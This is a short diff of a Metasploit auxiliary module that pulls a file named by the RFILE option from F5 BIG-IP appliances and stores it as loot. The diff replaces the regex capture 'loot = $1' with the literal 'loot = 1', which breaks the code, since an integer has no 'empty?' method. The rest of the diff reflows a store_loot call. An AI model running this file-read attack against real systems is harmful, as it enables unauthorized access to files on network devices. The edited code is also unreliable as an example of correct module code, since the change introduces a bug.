@@ -98,13 +98,18 @@ class Metasploit4 < Msf::Auxiliary
 		if res and res.code == 200
 			case res.body
 			when /has sent unknown dialogueType/
-				loot = $1
+				loot = 1
 				if not loot or loot.empty?
 					print_status("#{rhost}:#{rport} Retrieved empty file from #{rhost}:#{rport}")
 					return
 				end
 				f = ::File.basename(datastore['RFILE'])
-				path = store_loot('f5.bigip.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
+				path = store_loot('f5.bigip.file', 
+				'application/octet-stream', 
+				rhost, 
+				loot, 
+				f, 
+				datastore['RFILE'])
 				print_status("#{rhost}:#{rport} F5 BIG-IP - #{datastore['RFILE']} saved in #{path}")
 				return
 			end
